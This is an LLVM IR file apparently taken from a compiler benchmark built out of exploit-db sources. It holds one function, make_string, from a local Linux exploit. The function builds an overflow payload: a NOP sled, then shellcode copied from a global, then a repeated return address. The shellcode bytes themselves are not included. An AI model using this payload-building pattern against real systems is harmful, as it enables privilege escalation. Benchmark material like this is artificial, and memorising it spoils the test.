; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_120.c_make_string.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_120.c_make_string.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@buffer = common dso_local global i8* null, align 8
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [39 x i8] c"[-] Can't allocate memory, exiting...\0A\00", align 1
@ptr = common dso_local global i8* null, align 8
@BSIZE = common dso_local global i64 0, align 8
@shellcode = common dso_local global i32* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @make_string(i64 %0) #0 {
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i64, align 8
  %5 = alloca i64, align 8
  %6 = alloca i64*, align 8
  store i64 %0, i64* %2, align 8
  %7 = call i64 @malloc(i32 512)
  %8 = inttoptr i64 %7 to i8*
  store i8* %8, i8** @buffer, align 8
  %9 = load i8*, i8** @buffer, align 8
  %10 = icmp ne i8* %9, null
  br i1 %10, label %15, label %11

11:                                               ; preds = %1
  %12 = load i32, i32* @stderr, align 4
  %13 = call i32 @fprintf(i32 %12, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str, i64 0, i64 0))
  %14 = call i32 @exit(i32 -1) #3
  unreachable

15:                                               ; preds = %1
  %16 = load i64, i64* %2, align 8
  store i64 %16, i64* %4, align 8
  %17 = load i8*, i8** @buffer, align 8
  store i8* %17, i8** @ptr, align 8
  %18 = load i8*, i8** @ptr, align 8
  %19 = load i64, i64* @BSIZE, align 8
  %20 = load i32*, i32** @shellcode, align 8
  %21 = call i32 @strlen(i32* %20)
  %22 = sext i32 %21 to i64
  %23 = sub nsw i64 %19, %22
  %24 = call i32 @memset(i8* %18, i32 144, i64 %23)
  %25 = load i64, i64* @BSIZE, align 8
  %26 = load i32*, i32** @shellcode, align 8
  %27 = call i32 @strlen(i32* %26)
  %28 = sext i32 %27 to i64
  %29 = sub nsw i64 %25, %28
  %30 = load i8*, i8** @ptr, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 %29
  store i8* %31, i8** @ptr, align 8
  store i32 0, i32* %3, align 4
  br label %32

32:                                               ; preds = %46, %15
  %33 = load i32, i32* %3, align 4
  %34 = load i32*, i32** @shellcode, align 8
  %35 = call i32 @strlen(i32* %34)
  %36 = icmp slt i32 %33, %35
  br i1 %36, label %37, label %49

37:                                               ; preds = %32
  %38 = load i32*, i32** @shellcode, align 8
  %39 = load i32, i32* %3, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i32, i32* %38, i64 %40
  %42 = load i32, i32* %41, align 4
  %43 = trunc i32 %42 to i8
  %44 = load i8*, i8** @ptr, align 8
  %45 = getelementptr inbounds i8, i8* %44, i32 1
  store i8* %45, i8** @ptr, align 8
  store i8 %43, i8* %44, align 1
  br label %46

46:                                               ; preds = %37
  %47 = load i32, i32* %3, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %3, align 4
  br label %32

49:                                               ; preds = %32
  %50 = load i8*, i8** @ptr, align 8
  %51 = bitcast i8* %50 to i64*
  store i64* %51, i64** %6, align 8
  store i32 0, i32* %3, align 4
  br label %52

52:                                               ; preds = %59, %49
  %53 = load i32, i32* %3, align 4
  %54 = icmp slt i32 %53, 20
  br i1 %54, label %55, label %62

55:                                               ; preds = %52
  %56 = load i64, i64* %4, align 8
  %57 = load i64*, i64** %6, align 8
  %58 = getelementptr inbounds i64, i64* %57, i32 1
  store i64* %58, i64** %6, align 8
  store i64 %56, i64* %57, align 8
  br label %59

59:                                               ; preds = %55
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %52

62:                                               ; preds = %52
  %63 = load i64*, i64** %6, align 8
  %64 = bitcast i64* %63 to i8*
  store i8* %64, i8** @ptr, align 8
  %65 = load i8*, i8** @ptr, align 8
  store i8 0, i8* %65, align 1
  ret i32 0
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(i8*, i32, i64) #1

declare dso_local i32 @strlen(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
